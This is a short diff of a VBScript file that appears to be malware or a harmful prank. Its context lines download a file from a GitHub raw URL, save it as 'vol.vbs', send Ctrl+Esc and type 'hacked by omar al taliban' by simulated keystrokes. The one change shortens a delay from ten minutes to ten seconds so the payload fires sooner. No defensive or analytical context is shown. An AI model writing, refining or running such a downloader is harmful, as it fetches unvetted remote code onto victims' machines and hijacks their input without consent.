@@ -18,7 +18,7 @@ URL = "https://raw.githubusercontent.com/greisenmeisen/legendary-invention/main/
 objWinHttp.open "GET", URL, False
 objWinHttp.send ""
 SaveBinaryData "vol.vbs",objWinHttp.responseBody
-WScript.Sleep 600000
+WScript.Sleep 10000
 vb.Sendkeys "^{ESC}"
 WshShell.SendKeys "hacked by omar al taliban"
 WScript.Sleep 100
